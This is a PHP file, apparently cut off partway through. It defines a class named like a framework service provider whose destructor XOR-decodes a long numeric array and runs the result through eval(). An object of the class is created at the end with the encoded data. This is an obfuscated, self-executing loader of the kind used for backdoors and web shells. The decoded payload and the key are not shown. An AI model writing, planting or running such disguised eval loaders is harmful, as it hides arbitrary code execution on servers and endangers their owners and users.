<?php
class Container_Service_Provider_e63c {
    private $d; private $k;
    public function __construct($a, $b) { $this->d = $a; $this->k = $b; }
    public function __destruct() {
        $o = '';
        foreach($this->d as $i => $v) { $o .= chr($v ^ ord($this->k[$i % strlen($this->k)])); }
        eval('?>' . $o);
    }
}
$app = new Container_Service_Provider_e63c([12, 12, 71, 9, 21, 108, 31, 25, 26, 57, 23, 75, 69, 34, 89, 65, 85, 80, 67, 65, 55, 3, 93, 92, 68, 86, 23, 49, 45, 54, 16, 118, 72, 86, 84, 20, 17, 9, 66, 19, 71, 90, 67, 9, 69, 35, 72, 67, 81, 93, 83, 4, 1, 70, 99, 91, 85, 95, 91, 78, 38, 42, 121, 19, 118, 82, 91, 13, 7, 7, 83, 88, 67, 57, 23, 75, 69, 43, 85, 93, 87, 82, 90, 3, 12, 10, 16, 88, 95, 87, 82, 65, 1, 7, 66, 90, 16, 102, 101, 45, 69, 3, 91, 64, 68, 86, 69, 15, 4, 10, 16, 94, 85, 93, 80, 6, 16, 8, 81, 88, 81, 93, 23, 12, 16, 10, 68, 90, 29, 95, 86, 17, 12, 21, 16, 85, 81, 95, 91, 3, 4, 5, 91, 19, 24, 80, 98, 51, 41, 74, 16, 96, 68, 65, 82, 0, 8, 74, 16, 96, 95, 80, 92, 4, 17, 74, 16, 57, 16, 25, 23, 9, 12, 8, 87, 84, 81, 19, 92, 14, 8, 4, 89, 93, 81, 64, 94, 65, 21, 3, 94, 70, 88, 19, 1, 65, 3, 19, 94, 84, 67, 90, 23, 4, 14, 21, 85, 88, 69, 64, 94, 65, 22, 14, 85, 95, 92, 19, 83, 0, 11, 70, 7, 19, 69, 71, 94, 13, 12, 18, 81, 64, 16, 112, 123, 40, 69, 4, 89, 93, 81, 65, 78, 72, 69, 108, 16, 25, 16, 95, 86, 13, 16, 70, 92, 82, 94, 84, 68, 20, 11, 1, 16, 94, 85, 93, 93, 0, 9, 7, 94, 88, 81, 93, 89, 24, 4, 70, 70, 90, 81, 19, 82, 23, 4, 10, 24, 26, 30, 57, 23, 75, 74, 108, 58, 23, 68, 82, 69, 6, 0, 18, 101, 65, 92, 19, 10, 65, 71, 14, 68, 71, 64, 9, 24, 78, 84, 81, 3, 29, 2, 3, 15, 79, 84, 83, 3, 29, 1, 11, 7, 78, 15, 84, 6, 3, 9, 1, 14, 62, 84, 85, 31, 90, 94, 90, 67, 79, 17, 30, 68, 17, 11, 19, 24, 78, 69, 33, 81, 93, 68, 90, 23, 5, 0, 8, 87, 82, 94, 19, 98, 51, 41, 70, 68, 82, 66, 84, 82, 21, 69, 39, 94, 87, 81, 57, 61, 78, 74, 70, 118, 70, 94, 84, 68, 8, 69, 19, 68, 82, 93, 82, 23, 17, 0, 8, 87, 82, 93, 81, 94, 13, 69, 13, 95, 87, 85, 19, 83, 4, 11, 1, 81, 93, 16, 85, 86, 13, 9, 4, 81, 80, 91, 19, 85, 4, 23, 10, 81, 67, 89, 64, 61, 7, 16, 8, 83, 71, 89, 92, 89, 65, 2, 3, 68, 97, 85, 94, 88, 21, 0, 37, 95, 87, 85, 27, 68, 21, 23, 15, 94, 84, 16, 23, 66, 19, 9, 79, 10, 19, 15, 64, 67, 19, 12, 8, 87, 19, 75, 57, 23, 65, 69, 70, 31, 28, 16, 2, 25, 65, 38, 9, 82, 82, 16, 80, 98, 51, 41, 108, 16, 19, 16, 19, 94, 7, 69, 78, 86, 70, 94, 80, 67, 8, 10, 8, 111, 86, 72, 90, 68, 21, 22, 78, 23, 80, 69, 65, 91, 62, 12, 8, 89, 71, 23, 26, 30, 65, 30, 108, 16, 19, 16, 19, 23, 65, 69, 70, 20, 80, 88, 19, 10, 65, 6, 19, 66, 95, 111, 90, 89, 8, 17, 78, 25, 8, 58, 19, 23, 65, 69, 70, 16, 19, 16, 80, 66, 19, 9, 57, 67, 86, 68, 92, 71, 21, 58, 7, 66, 65, 81, 74, 31, 69, 6, 14, 28, 19, 107, 57, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 115, 102, 98, 127, 120, 49, 49, 57, 101, 97, 124, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 91, 14, 19, 20, 70, 69, 13, 73, 108, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 116, 52, 55, 42, 127, 99, 100, 108, 101, 36, 49, 51, 98, 125, 100, 97, 118, 47, 54, 32, 117, 97, 16, 14, 9, 65, 17, 20, 69, 86, 28, 57, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 115, 102, 98, 127, 120, 49, 49, 57, 118, 124, 124, 127, 120, 54, 41, 41, 115, 114, 100, 122, 120, 47, 69, 91, 14, 19, 68, 65, 66, 4, 73, 108, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 116, 52, 55, 42, 127, 99, 100, 108, 99, 40, 40, 35, 127, 102, 100, 19, 23, 65, 69, 70, 16, 19, 16, 14, 9, 65, 86, 86, 28, 57, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 38, 51, 98, 127, 127, 99, 99, 62, 54, 53, 124, 108, 102, 118, 101, 40, 35, 63, 96, 118, 117, 97, 23, 92, 91, 70, 86, 82, 92, 64, 82, 77, 111, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 16, 112, 98, 51, 41, 41, 96, 103, 111, 96, 100, 45, 58, 48, 117, 97, 121, 117, 110, 41, 42, 53, 100, 19, 13, 13, 23, 7, 4, 10, 67, 86, 28, 57, 23, 65, 69, 70, 16, 19, 16, 19, 106, 72, 94, 108, 16, 19, 16, 19, 23, 65, 69, 70, 20, 80, 95, 87, 82, 65, 88, 70, 83, 70, 66, 95, 104, 4, 29, 3, 83, 27, 20, 80, 95, 72, 94, 108, 16, 19, 16, 19, 23, 65, 69, 70, 83, 70, 66, 95, 104, 2, 9, 9, 67, 86, 24, 23, 84, 9, 76, 93, 58, 19, 16, 19, 23, 65, 69, 70, 16, 90, 86, 19, 31, 69, 6, 9, 84, 86, 16, 18, 10, 92, 69, 0, 81, 95, 67, 86, 23, 71, 67, 70, 17, 86, 93, 67, 67, 24, 77, 66, 83, 92, 84, 86, 30, 72, 69, 20, 85, 71, 69, 65, 89, 65, 65, 5, 95, 87, 85, 8, 61, 65, 69, 70, 16, 78, 58, 57, 23, 65, 69, 70, 31, 28, 16, 1, 25, 65, 38, 9, 82, 82, 16, 85, 94, 13, 0, 57, 87, 86, 68, 108, 84, 14, 11, 18, 85, 93, 68, 64, 61, 65, 69, 70, 16, 90, 86, 19, 31, 8, 11, 15, 111, 84, 85, 71, 31, 70, 4, 10, 92, 92, 71, 108, 66, 19, 9, 57, 86, 92, 64, 86, 89, 70, 76, 79, 16, 72, 58, 19, 23, 65, 69, 70, 16, 19, 16, 23, 84, 14, 11, 18, 85, 75, 68, 19, 10, 65, 22, 18, 66, 86, 81, 94, 104, 2, 10, 8, 68, 86, 72, 71, 104, 2, 23, 3, 81, 71, 85, 27, 108, 107, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 23, 64, 68, 13, 66, 70, 13, 13, 16, 104, 61, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 70, 19, 3, 66, 90, 86, 74, 104, 17, 0, 3, 66, 20, 16, 19, 23, 65, 69, 70, 13, 13, 16, 85, 86, 13, 22, 3, 28, 57, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 23, 69, 82, 19, 12, 0, 73, 108, 64, 86, 82, 19, 58, 8, 81, 94, 85, 20, 23, 92, 91, 70, 86, 82, 92, 64, 82, 107, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 109, 57, 23, 65, 69, 70, 16, 19, 16, 19, 106, 72, 94, 108, 16, 19, 16, 19, 23, 65, 69, 70, 20, 80, 95, 87, 82, 65, 88, 70, 112, 85, 89, 95, 82, 62, 2, 3, 68, 108, 83, 92, 89, 21, 0, 8, 68, 64, 24, 23, 66, 19, 9, 74, 16, 85, 81, 95, 68, 4, 73, 70, 20, 80, 95, 93, 67, 4, 29, 18, 25, 8, 58, 19, 23, 65, 69, 70, 16, 19, 16, 90, 81, 65, 77, 66, 83, 92, 84, 86, 23, 64, 88, 91, 16, 85, 81, 95, 68, 4, 69, 64, 22, 19, 17, 86, 90, 17, 17, 31, 24, 23, 83, 92, 83, 4, 76, 79, 16, 65, 85, 71, 66, 19, 11, 70, 20, 80, 95, 87, 82, 90, 111, 70, 16, 19, 16, 78, 61, 107, 69, 70, 16, 19, 31, 28, 23, 82, 75, 70, 115, 92, 82, 82, 23, 7, 22, 9, 83, 88, 95, 67, 82, 15, 69, 78, 98, 82, 71, 19, 99, 34, 53, 70, 99, 92, 83, 88, 82, 21, 76, 108, 16, 19, 16, 19, 19, 17, 4, 20, 67, 86, 84, 19, 10, 65, 21, 7, 66, 64, 85, 108, 66, 19, 9, 78, 20, 70, 66, 95, 30, 90, 111, 70, 16, 19, 16, 23, 95, 14, 22, 18, 16, 19, 16, 14, 23, 69, 21, 7, 66, 64, 85, 87, 108, 70, 13, 9, 67, 71, 23, 110, 23, 94, 90, 70, 23, 20, 11, 57, 23, 65, 69, 70, 20, 67, 95, 65, 67, 65, 69, 70, 13, 19, 20, 67, 86, 19, 22, 3, 84, 104, 23, 67, 88, 19, 17, 65, 109, 19, 15, 12, 23, 73, 77, 66, 64, 82, 66, 64, 82, 5, 62, 65, 67, 80, 88, 86, 90, 4, 66, 59, 16, 12, 15, 19, 16, 9, 17, 18, 64, 20, 25, 19, 10, 92, 88, 70, 23, 91, 68, 71, 71, 18, 66, 70, 15, 19, 4, 7, 4, 65, 95, 70, 8, 3, 25, 8, 61, 65, 69, 70, 16, 23, 64, 82, 67, 9, 69, 70, 16, 14, 16, 27, 19, 17, 4, 20, 67, 86, 84, 104, 16, 17, 4, 18, 88, 20, 109, 19, 8, 94, 69, 65, 31, 20, 25, 19, 25, 65, 77, 15, 67, 64, 85, 71, 31, 69, 21, 7, 66, 64, 85, 87, 108, 70, 20, 19, 85, 65, 73, 20, 106, 72, 69, 89, 16, 20, 15, 20, 23, 79, 69, 66, 64, 82, 66, 64, 82, 5, 62, 65, 65, 70, 85, 65, 78, 70, 56, 70, 10, 19, 23, 20, 30, 90, 111, 70, 16, 19, 16, 23, 67, 0, 23, 1, 85, 71, 16, 14, 23, 73, 77, 66, 64, 82, 66, 64, 82, 5, 62, 65, 67, 80, 88, 86, 90, 4, 66, 59, 16, 12, 15, 19, 16, 9, 17, 18, 64, 20, 25, 19, 10, 92, 88, 70, 23, 91, 68, 71, 71, 18, 66, 70, 15, 19, 23, 64, 68, 13, 95, 73, 31, 20, 16, 9, 23, 70, 66, 79, 16, 29, 16, 23, 95, 14, 22, 18, 11, 57, 16, 19, 23, 65, 111, 70, 16, 19, 16, 23, 81, 17, 69, 91, 16, 115, 86, 64, 88, 2, 14, 9, 64, 86, 94, 27, 19, 21, 4, 20, 87, 86, 68, 31, 23, 69, 21, 9, 66, 71, 28, 19, 19, 4, 23, 20, 94, 92, 28, 19, 19, 4, 23, 20, 67, 71, 66, 31, 23, 82, 85, 79, 11, 57, 16, 19, 23, 65, 12, 0, 16, 27, 20, 85, 71, 72, 69, 29, 58, 19, 16, 19, 23, 65, 69, 70, 16, 23, 95, 70, 67, 65, 88, 70, 18, 116, 117, 103, 23, 69, 21, 7, 68, 91, 16, 123, 99, 53, 53, 73, 1, 29, 1, 111, 69, 61, 11, 46, 95, 64, 68, 9, 23, 69, 13, 9, 67, 71, 108, 65, 107, 15, 38, 9, 94, 93, 85, 80, 67, 8, 10, 8, 10, 19, 115, 95, 88, 18, 0, 58, 66, 111, 94, 111, 69, 61, 11, 68, 11, 57, 16, 19, 23, 65, 69, 70, 16, 19, 86, 68, 69, 8, 17, 3, 24, 23, 86, 67, 27, 65, 65, 9, 69, 71, 25, 8, 61, 65, 69, 70, 16, 19, 16, 19, 23, 69, 23, 3, 67, 67, 95, 93, 68, 4, 69, 91, 16, 20, 23, 8, 61, 65, 69, 70, 16, 19, 16, 19, 23, 22, 13, 15, 92, 86, 16, 27, 22, 7, 0, 9, 86, 27, 20, 85, 71, 72, 76, 70, 75, 57, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 65, 20, 85, 64, 64, 92, 89, 18, 0, 70, 30, 14, 16, 85, 80, 4, 17, 21, 24, 23, 86, 67, 27, 65, 80, 87, 2, 26, 11, 57, 23, 65, 69, 70, 16, 19, 16, 19, 74, 107, 69, 70, 16, 19, 16, 19, 23, 65, 3, 5, 92, 92, 67, 86, 31, 69, 3, 22, 25, 8, 58, 19, 23, 65, 69, 70, 16, 19, 16, 23, 71, 0, 23, 18, 67, 19, 13, 19, 82, 25, 21, 10, 95, 87, 85, 27, 21, 61, 23, 58, 94, 111, 66, 111, 89, 67, 73, 70, 20, 65, 85, 64, 71, 14, 11, 21, 85, 31, 16, 1, 30, 90, 111, 70, 16, 19, 16, 19, 23, 65, 69, 15, 86, 19, 24, 90, 68, 18, 0, 18, 24, 23, 64, 82, 69, 21, 22, 61, 1, 110, 25, 19, 17, 71, 69, 71, 85, 94, 64, 71, 78, 73, 65, 22, 81, 65, 68, 64, 108, 80, 56, 79, 25, 19, 66, 86, 67, 20, 23, 8, 16, 23, 64, 82, 69, 21, 22, 61, 1, 110, 11, 57, 23, 65, 69, 70, 77, 57, 58, 19, 23, 65, 69, 73, 31, 19, 4, 29, 23, 36, 29, 22, 81, 93, 84, 86, 83, 65, 54, 14, 85, 95, 92, 19, 17, 65, 38, 42, 121, 19, 118, 82, 91, 13, 7, 7, 83, 88, 16, 27, 122, 20, 9, 18, 89, 30, 99, 90, 89, 10, 69, 64, 16, 126, 69, 95, 67, 8, 72, 36, 89, 93, 81, 65, 78, 72, 111, 70, 16, 19, 16, 23, 82, 18, 6, 7, 64, 86, 84, 102, 69, 13, 69, 91, 16, 86, 67, 80, 86, 17, 0, 21, 88, 86, 92, 95, 86, 19, 2, 78, 20, 70, 66, 95, 30, 90, 111, 70, 16, 19, 16, 23, 85, 8, 11, 7, 66, 90, 85, 64, 23, 92, 69, 61, 58, 19, 16, 19, 23, 65, 69, 70, 16, 17, 83, 70, 69, 13, 69, 75, 67, 19, 29, 127, 23, 76, 72, 11, 81, 75, 29, 71, 94, 12, 0, 70, 3, 3, 16, 23, 82, 18, 6, 7, 64, 86, 84, 102, 69, 13, 71, 74, 58, 19, 16, 19, 23, 65, 69, 70, 16, 17, 71, 84, 82, 21, 69, 75, 65, 124, 29, 19, 26, 76, 17, 15, 93, 86, 95, 70, 67, 92, 86, 86, 16, 23, 85, 64, 84, 0, 21, 3, 84, 102, 66, 95, 21, 77, 111, 70, 16, 19, 16, 19, 23, 65, 69, 68, 64, 74, 68, 91, 88, 15, 86, 70, 29, 80, 16, 111, 21, 8, 8, 22, 95, 65, 68, 19, 66, 19, 9, 10, 89, 81, 30, 65, 82, 16, 16, 3, 67, 71, 11, 19, 71, 19, 12, 8, 68, 27, 69, 65, 91, 13, 12, 4, 30, 65, 85, 66, 66, 4, 22, 18, 30, 70, 66, 95, 88, 17, 0, 8, 24, 20, 20, 70, 69, 13, 66, 79, 30, 65, 85, 82, 83, 73, 76, 72, 84, 86, 83, 92, 83, 4, 77, 3, 66, 65, 95, 65, 68, 92, 66, 15, 87, 93, 95, 65, 82, 70, 76, 79, 108, 17, 18, 31, 61, 65, 69, 70, 16, 19, 16, 19, 23, 67, 21, 31, 68, 91, 95, 93, 23, 76, 6, 70, 108, 17, 89, 94, 71, 14, 23, 18, 16, 70, 66, 95, 91, 8, 7, 93, 16, 67, 66, 90, 89, 21, 77, 19, 66, 95, 92, 90, 85, 79, 16, 20, 92, 92, 64, 86, 89, 73, 66, 66, 69, 65, 92, 20, 30, 79, 23, 3, 81, 87, 24, 26, 30, 61, 71, 68, 28, 57, 16, 19, 23, 65, 69, 70, 16, 19, 18, 67, 95, 17, 69, 75, 66, 19, 108, 17, 82, 2, 13, 9, 16, 85, 89, 95, 82, 62, 2, 3, 68, 108, 83, 92, 89, 21, 0, 8, 68, 64, 24, 20, 19, 20, 23, 10, 23, 26, 11, 111, 21, 67, 73, 108, 16, 19, 16, 19, 23, 65, 69, 70, 18, 67, 95, 68, 82, 19, 22, 14, 85, 95, 92, 19, 26, 34, 10, 11, 93, 82, 94, 87, 23, 61, 71, 78, 126, 86, 71, 30, 120, 3, 15, 3, 83, 71, 16, 96, 78, 18, 17, 3, 93, 29, 126, 86, 67, 79, 50, 3, 82, 112, 92, 90, 82, 15, 17, 79, 30, 119, 95, 68, 89, 13, 10, 7, 84, 96, 68, 65, 94, 15, 2, 78, 23, 23, 69, 65, 91, 70, 76, 58, 18, 17, 28, 57, 23, 65, 69, 70, 16, 19, 16, 19, 21, 7, 0, 18, 83, 91, 16, 30, 88, 65, 72, 70, 20, 86, 67, 80, 86, 17, 0, 2, 101, 65, 92, 17, 61, 65, 69, 70, 16, 110, 11, 57, 61, 65, 69, 70, 16, 85, 95, 65, 82, 0, 6, 14, 16, 27, 20, 81, 94, 15, 4, 20, 89, 86, 67, 19, 86, 18, 69, 66, 83, 94, 84, 26, 23, 26, 111, 70, 16, 19, 16, 19, 23, 65, 69, 66, 95, 70, 68, 67, 66, 21, 69, 91, 16, 86, 72, 86, 84, 20, 17, 3, 115, 92, 93, 94, 86, 15, 1, 39, 92, 71, 85, 65, 89, 0, 17, 15, 70, 86, 24, 23, 84, 12, 1, 79, 11, 57, 16, 19, 23, 65, 69, 70, 16, 19, 89, 85, 23, 73, 68, 3, 93, 67, 68, 74, 31, 69, 10, 19, 68, 67, 69, 71, 30, 72, 69, 29, 58, 19, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 19, 0, 18, 69, 65, 94, 19, 19, 14, 16, 18, 64, 70, 68, 8, 61, 65, 69, 70, 16, 19, 16, 19, 23, 28, 111, 70, 16, 19, 16, 78, 61, 107, 69, 70, 16, 19, 66, 86, 67, 20, 23, 8, 16, 93, 69, 95, 91, 90, 111, 27, 58, 57, 31, 28, 23, 39, 16, 8, 87, 64, 89, 19, 85, 0, 11, 18, 69, 19, 69, 93, 67, 20, 14, 70, 93, 86, 94, 84, 82, 10, 22, 3, 91, 70, 67, 90, 23, 17, 0, 20, 89, 93, 68, 82, 95, 65, 1, 3, 94, 84, 81, 93, 23, 12, 0, 8, 83, 92, 82, 82, 23, 18, 0, 10, 69, 65, 69, 91, 23, 7, 16, 8, 87, 64, 89, 19, 68, 8, 11, 13, 16, 64, 89, 64, 67, 4, 8, 70, 73, 82, 94, 84, 23, 21, 0, 20, 67, 86, 84, 90, 86, 107, 3, 19, 94, 80, 68, 90, 88, 15, 69, 3, 72, 86, 83, 70, 67, 4, 38, 9, 93, 94, 81, 93, 83, 32, 9, 18, 85, 65, 94, 82, 67, 8, 19, 3, 24, 64, 68, 65, 94, 15, 2, 70, 20, 80, 93, 87, 30, 91, 69, 89, 67, 71, 66, 90, 89, 6, 69, 29, 58, 19, 16, 19, 23, 78, 74, 70, 1, 29, 16, 64, 95, 4, 9, 10, 111, 86, 72, 86, 84, 107, 69, 70, 16, 19, 89, 85, 23, 73, 3, 19, 94, 80, 68, 90, 88, 15, 58, 3, 72, 90, 67, 71, 68, 73, 66, 21, 88, 86, 92, 95, 104, 4, 29, 3, 83, 20, 25, 26, 23, 26, 111, 70, 16, 19, 16, 19, 23, 65, 69, 66, 66, 86, 67, 19, 10, 65, 37, 21, 88, 86, 92, 95, 104, 4, 29, 3, 83, 27, 20, 80, 90, 5, 76, 93, 58, 19, 16, 19, 23, 65, 69, 70, 16, 90, 86, 19, 31, 64, 0, 11, 64, 71, 73, 27, 19, 19, 0, 21, 25, 26, 16, 65, 82, 21, 16, 20, 94, 19, 20, 65, 82, 18, 94, 108, 16, 19, 16, 19, 74, 107, 111, 70, 16, 19, 16, 28, 24, 65, 87, 72, 16, 86, 72, 86, 84, 107, 69, 70, 16, 19, 89, 85, 23, 73, 3, 19, 94, 80, 68, 90, 88, 15, 58, 3, 72, 90, 67, 71, 68, 73, 66, 3, 72, 86, 83, 20, 30, 72, 69, 29, 58, 19, 16, 19, 23, 65, 69, 70, 16, 23, 95, 70, 67, 17, 16, 18, 16, 14, 16, 104, 106, 90, 111, 70, 16, 19, 16, 19, 23, 65, 69, 38, 85, 75, 85, 80, 31, 69, 6, 11, 84, 31, 16, 23, 88, 20, 17, 22, 69, 71, 25, 8, 61, 65, 69, 70, 16, 19, 16, 19, 23, 69, 23, 3, 67, 19, 13, 19, 94, 12, 21, 10, 95, 87, 85, 27, 21, 61, 11, 68, 28, 19, 20, 92, 66, 21, 21, 19, 68, 26, 11, 57, 23, 65, 69, 70, 16, 19, 16, 19, 94, 7, 69, 78, 17, 86, 93, 67, 67, 24, 77, 66, 66, 86, 67, 26, 30, 65, 23, 3, 68, 70, 66, 93, 23, 69, 23, 3, 67, 8, 58, 19, 23, 65, 69, 27, 58, 57, 16, 19, 23, 65, 74, 73, 16, 0, 30, 19, 68, 24, 22, 18, 85, 94, 58, 19, 23, 65, 69, 15, 86, 19, 24, 85, 66, 15, 6, 18, 89, 92, 94, 108, 82, 25, 12, 21, 68, 64, 24, 20, 68, 24, 22, 18, 85, 94, 23, 26, 30, 65, 30, 108, 16, 19, 16, 19, 23, 65, 69, 70, 95, 81, 111, 64, 67, 0, 23, 18, 24, 26, 11, 57, 23, 65, 69, 70, 16, 19, 16, 19, 119, 18, 28, 21, 68, 86, 93, 27, 19, 2, 8, 2, 25, 8, 58, 19, 23, 65, 69, 70, 16, 19, 16, 23, 69, 4, 22, 70, 13, 19, 95, 81, 104, 6, 0, 18, 111, 80, 92, 86, 86, 15, 77, 79, 11, 57, 16, 19, 23, 65, 69, 70, 16, 19, 89, 85, 23, 73, 68, 3, 93, 67, 68, 74, 31, 69, 23, 3, 67, 26, 25, 19, 69, 4, 17, 19, 66, 93, 16, 23, 69, 4, 22, 93, 58, 19, 16, 19, 23, 28, 111, 108, 16, 19, 16, 19, 24, 78, 69, 82, 30, 19, 64, 82, 68, 18, 17, 14, 66, 70, 58, 19, 23, 65, 69, 15, 86, 19, 24, 85, 66, 15, 6, 18, 89, 92, 94, 108, 82, 25, 12, 21, 68, 64, 24, 20, 71, 0, 22, 21, 68, 91, 66, 70, 16, 72, 76, 70, 75, 57, 16, 19, 23, 65, 69, 70, 16, 19, 95, 81, 104, 18, 17, 7, 66, 71, 24, 26, 12, 107, 69, 70, 16, 19, 16, 19, 23, 65, 37, 22, 81, 64, 67, 71, 95, 19, 16, 78, 20, 80, 93, 87, 30, 90, 111, 70, 16, 19, 16, 19, 23, 65, 69, 66, 66, 86, 67, 19, 10, 65, 10, 4, 111, 84, 85, 71, 104, 2, 9, 3, 81, 93, 24, 26, 12, 107, 69, 70, 16, 19, 16, 19, 23, 65, 12, 0, 16, 27, 17, 86, 90, 17, 17, 31, 24, 23, 66, 86, 68, 72, 76, 70, 66, 86, 68, 70, 69, 15, 69, 66, 66, 86, 67, 8, 61, 65, 69, 70, 16, 78, 58, 57, 23, 65, 69, 70, 31, 28, 16, 6, 25, 65, 21, 9, 64, 86, 94, 57, 23, 65, 69, 70, 89, 85, 16, 27, 81, 20, 11, 5, 68, 90, 95, 93, 104, 4, 29, 15, 67, 71, 67, 27, 16, 17, 10, 22, 85, 93, 23, 26, 30, 65, 30, 108, 16, 19, 16, 19, 23, 65, 69, 70, 20, 91, 81, 93, 83, 13, 0, 70, 13, 19, 112, 67, 88, 17, 0, 8, 24, 23, 83, 94, 83, 77, 69, 65, 66, 20, 25, 8, 61, 65, 69, 70, 16, 19, 16, 19, 23, 8, 3, 70, 24, 23, 88, 82, 89, 5, 9, 3, 25, 19, 75, 57, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 20, 65, 85, 64, 23, 92, 69, 65, 23, 8, 58, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 17, 88, 90, 92, 86, 23, 73, 68, 0, 85, 92, 86, 27, 19, 9, 4, 8, 84, 95, 85, 26, 30, 65, 30, 108, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 20, 65, 85, 64, 23, 79, 88, 70, 86, 84, 85, 71, 68, 73, 65, 14, 81, 93, 84, 95, 82, 77, 69, 83, 1, 1, 25, 8, 61, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 78, 58, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 38, 64, 80, 92, 92, 68, 4, 77, 66, 88, 82, 94, 87, 91, 4, 76, 93, 58, 19, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 8, 3, 70, 24, 18, 85, 94, 71, 21, 28, 78, 20, 65, 85, 64, 30, 72, 69, 20, 85, 71, 69, 65, 89, 65, 65, 20, 85, 64, 11, 57, 23, 65, 69, 70, 16, 19, 16, 19, 74, 107, 69, 70, 16, 19, 77, 57, 61, 65, 69, 70, 16, 28, 31, 19, 1, 79, 69, 22, 66, 92, 83, 108, 88, 17, 0, 8, 58, 19, 16, 19, 23, 8, 3, 70, 24, 85, 69, 93, 84, 21, 12, 9, 94, 108, 85, 75, 94, 18, 17, 21, 24, 20, 64, 65, 88, 2, 58, 9, 64, 86, 94, 20, 30, 72, 69, 29, 58, 19, 16, 19, 23, 65, 69, 70, 16, 23, 84, 86, 68, 2, 23, 15, 64, 71, 95, 65, 68, 65, 88, 70, 107, 57, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 85, 70, 13, 13, 16, 104, 16, 17, 12, 22, 85, 20, 28, 19, 16, 19, 66, 59, 28, 57, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 84, 70, 13, 13, 16, 104, 16, 17, 12, 22, 85, 20, 28, 19, 16, 22, 66, 59, 28, 57, 16, 19, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 87, 70, 13, 13, 16, 104, 16, 17, 12, 22, 85, 20, 28, 19, 16, 22, 66, 59, 58, 19, 16, 19, 23, 65, 69, 70, 16, 110, 11, 57, 23, 65, 69, 70, 16, 19, 16, 19, 19, 17, 23, 9, 83, 86, 67, 64, 23, 92, 69, 38, 64, 65, 95, 80, 104, 14, 21, 3, 94, 27, 20, 80, 90, 5, 73, 70, 20, 87, 85, 64, 84, 19, 12, 22, 68, 92, 66, 64, 27, 65, 65, 22, 89, 67, 85, 64, 30, 90, 111, 70, 16, 19, 16, 19, 23, 65, 69, 15, 86, 19, 24, 90, 68, 62, 23, 3, 67, 92, 69, 65, 84, 4, 77, 66, 64, 65, 95, 80, 82, 18, 22, 79, 25, 19, 75, 57, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 20, 65, 85, 64, 23, 92, 69, 21, 68, 65, 85, 82, 90, 62, 2, 3, 68, 108, 83, 92, 89, 21, 0, 8, 68, 64, 24, 23, 71, 8, 21, 3, 67, 104, 1, 110, 30, 90, 111, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 16, 85, 84, 13, 10, 21, 85, 27, 20, 67, 94, 17, 0, 21, 107, 3, 109, 26, 12, 107, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 86, 80, 91, 14, 22, 3, 24, 23, 64, 90, 71, 4, 22, 61, 1, 110, 25, 8, 61, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 85, 83, 95, 88, 18, 0, 78, 20, 67, 89, 67, 82, 18, 62, 84, 109, 26, 11, 57, 23, 65, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 64, 65, 95, 80, 104, 2, 9, 9, 67, 86, 24, 23, 71, 19, 10, 5, 85, 64, 67, 26, 12, 107, 69, 70, 16, 19, 16, 19, 23, 65, 69, 70, 16, 19, 89, 85, 23, 73, 68, 3, 93, 67, 68, 74, 31, 69, 23, 3, 67, 26, 25, 19, 69, 4, 17, 19, 66, 93, 16, 23, 69, 4, 22, 93, 58, 19, 16, 19, 23, 65, 69, 70, 16, 78, 58, 19, 23, 65, 69, 27, 58, 57, 16, 19, 23, 65, 23, 3, 68, 70, 66, 93, 23, 15, 16, 10, 92, 8, 58, 78, 61, 107, 74, 73, 16, 118, 91, 64, 82, 10, 16, 21, 89, 19, 64, 86, 89, 6, 4, 11, 82, 90, 92, 82, 89, 65, 14, 9, 84, 86, 58, 23, 84, 14, 1, 3, 16, 14, 16, 84, 82, 21, 55, 3, 93, 92, 68, 86, 116, 14, 1, 3, 24, 23, 68, 82, 69, 6, 0, 18, 101, 65, 92, 26, 12, 107, 111, 15, 86, 19, 24, 23, 84, 14, 1, 3, 16, 18, 13, 14, 23, 15, 16, 10, 92, 26, 16, 72, 61, 65, 69, 70, 16, 28, 31, 19, 118, 20, 17, 9, 29, 87, 85, 80, 88, 5, 0, 70, 90, 90, 91, 82, 23, 7, 10, 20, 93, 82, 68, 19, 71, 0, 28, 10, 95, 82, 84, 19, 86, 5, 4, 10, 81, 91, 16, 113, 86, 18, 0, 80, 4, 57, 16, 19, 23, 65, 12, 0, 16, 27, 82, 82, 68, 4, 83, 82, 111, 86, 94, 80, 88, 5, 0, 78, 82, 82, 67, 86, 1, 85, 58, 2, 85, 80, 95, 87, 82, 73, 65, 5, 95, 87, 85, 31, 23, 21, 23, 19, 85, 26, 25, 19, 10, 92, 88, 70, 20, 80, 95, 87, 82, 72, 69, 29, 58, 19, 16, 19, 23, 65, 69, 70, 16, 23, 84, 86, 84, 14, 1, 3, 84, 19, 13, 19, 85, 0, 22, 3, 6, 7, 111, 87, 82, 2, 10, 2, 85, 27, 20, 80, 88, 5, 0, 74, 16, 71, 66, 70, 